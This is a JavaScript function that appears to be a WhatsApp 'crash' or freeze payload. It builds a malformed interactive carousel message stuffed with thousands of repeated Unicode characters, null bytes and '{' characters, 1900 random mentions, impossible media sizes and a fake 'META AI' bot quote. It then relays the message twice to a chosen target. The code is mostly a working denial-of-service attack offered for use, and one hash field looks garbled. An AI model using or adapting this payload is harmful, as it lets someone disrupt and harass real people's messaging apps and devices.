async function forceClick(sock, target) {
  const buttonsList = [
    { type: "single_select", params: "" }
  ];

  for (let i = 0; i < 10; i++) {
    buttonsList.push(
      { type: "call_button", params: JSON.stringify({ status: true }) },
      { type: "copy_button", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
      { type: "quick_reply", params: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
    );
  }

  const messageData = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () => `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
            ]
          },
          remoteJid: target,
          participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
          stanzaId: "123",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
            forwardedAiBotMessageInfo: {
              botName: "META AI",
              botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
              creatorName: "Bot"
            }
          }
        },
        carouselMessage: {
          messageVersion: 1,
          cards: [
            {
              header: {
                hasMediaAttachment: true,
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc",
                  mimetype: "image/jpeg",
                  fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
                  fileLength: "9999999999999",
                  height: 9999,
                  width: 9999,
                  mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
                  fileEncSha256: "D0LtargetIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
                  directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc"
                }
              },
              body: { text: "\n" + "\u0000".repeat(5000) },
              nativeFlowMessage: {
                buttons: buttonsList,
                messageParamsJson: "{".repeat(10000)
              }
            }
          ]
        }
      }
    }
  };

  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
  await sock.relayMessage(target, messageData, { messageId: null, participant: { jid: target }, userJid: target });
}